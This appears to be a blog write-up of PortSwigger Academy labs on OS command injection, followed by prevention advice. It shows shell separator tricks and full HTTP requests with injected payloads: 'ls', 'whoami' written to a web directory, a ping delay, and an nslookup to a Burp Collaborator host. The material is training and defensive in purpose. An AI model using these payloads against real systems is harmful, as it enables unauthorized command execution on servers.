---
layout: post
title: "OS command injection"
date: 2025-07-04 00:00:00 +0100
categories: [portswigger, hacking]
tags: [lab, theory, os command injection, injection]
---

![oscom](pics/oscom.png)

### Intro

**Ways of injecting OS commands**
You can use a number of shell metacharacters to perform OS command injection attacks.
A number of characters function as command separators, allowing commands to be chained together.
- The following command separators work on both Windows and Unix-based systems:

```
&
&&
|
||
```

- The following command separators work only on Unix-based systems:

```
;
Newline (0x0a or \n)
```

- On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

```
`
injected command `
$(
injected command )
```

The different shell metacharacters have subtly different behaviors that might change whether they work in certain situations. This could impact whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.

#### Lab: OS command injection, simple case

- In the first lab it's just enough to add `; whoami` or `| whoami`

```html
POST /product/stock HTTP/2
Host: 0a31002b03679591816cd40a002600a1.web-security-academy.net
Cookie: session=THWO7HZQldRPMz3ZYkKT0lsVDNHzeseM
Content-Length: 29
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a31002b03679591816cd40a002600a1.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a31002b03679591816cd40a002600a1.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=1&storeId=1; ls
```

#### Lab: Blind OS command injection with time delays
- Sometimes there could exist an OS injection but no output is visible on the page
- Payload we will use here: `;+ping+-c+10+127.0.0.1+;` or `||+ping+-c+10+127.0.0.1+||`

```html
POST /feedback/submit HTTP/2
Host: 0a560086039d9558810aed3d007f008c.web-security-academy.net
Cookie: session=4gFfy2ssANmqNQA7KiLnSRtotOekEZGt
Content-Length: 118
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a560086039d9558810aed3d007f008c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a560086039d9558810aed3d007f008c.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=V6DwtmblzfcEqr1EUdUEi3PCf5ydo1oP&name=adam&email=test%40mail;+ping+-c+10+127.0.0.1+;&subject=topic&message=some
```

#### Lab: Blind OS command injection with output redirection

- We know that images is writable directory here so we could run this

```html
POST /feedback/submit HTTP/2
Host: 0adb007f046a861080c021ea001a00a4.web-security-academy.net
Cookie: session=E46IF9bjVPjipdCQWTapMdCFCYFBpQTW
Content-Length: 126
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
Origin: https://0adb007f046a861080c021ea001a00a4.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0adb007f046a861080c021ea001a00a4.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=SPR8A8SsnBj3oJuOjE0VzIQuvNYrlzyz&name=arst&email=test%40mail;whoami+>+/var/www/images/whoami.txt;&subject=ra&message=mess
```

- Next just open any image and update filename to `whoami.txt`

#### Lab: Blind OS command injection with out-of-band interaction

- Even I have no professional Burp (and collaborator) I was able to force labs to think that I did and solved this lab (UUID is just a random one)

```html
POST /feedback/submit HTTP/2
Host: 0a56009d03d5eb48800a6c57007a00a6.web-security-academy.net
Cookie: session=0TmmO3obs4FavUfC9RflkVF4PnXznQjm
Content-Length: 159
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a56009d03d5eb48800a6c57007a00a6.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a56009d03d5eb48800a6c57007a00a6.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=QrdBPnCXp3zmJsq3XW2sSEI73vBHtmtW&name=adam&email=t||+nslookup+https://6a982ff9-729f-4771-9ef2-32a200569897.burpcollaborator.net+||&subject=sub&message=mes
```
### How to prevent OS command injection attacks
1. Avoid Calling the Shell (Best Practice)
- Don’t use system(), exec(), popen(), shell_exec() or similar functions.
- Instead, use language-native APIs that don't involve the shell.

```python
# Bad
os.system("ping " + user_input)

# Ok
subprocess.run(["ping", user_input])  # safer with list, no shell involved, input validated, shell=False
```

2. Validate and Sanitize Input
- Strict allowlists (whitelists) for acceptable inputs.
- Use regular expressions to validate input format.
- Reject or sanitize unexpected input early.

```python
import re
if not re.fullmatch(r'[a-zA-Z0-9]+', user_input):
    raise ValueError("Invalid input")
```

3. Escape Arguments Properly
- If you absolutely must call the shell:
- Use argument escaping libraries.

```python
import shlex
command = "ping " + shlex.quote(user_input)
```

!But this is not fully secure. Avoid shell if possible.

4. Principle of Least Privilege
- Run applications and services with minimal privileges.
- Avoid running as `root` or `Administrator` unless absolutely necessary.

5. Web App Firewalls (WAFs)
- Deploy a WAF to block common command injection patterns.
- Should complement, not replace, proper code defenses.

6. Use Security Linters/Scanners
- Tools like Bandit (for Python), SonarQube, or Semgrep can catch unsafe function use.

7. Educate Developers
- Train devs on secure coding practices.
- Include code review checklists for security risks.
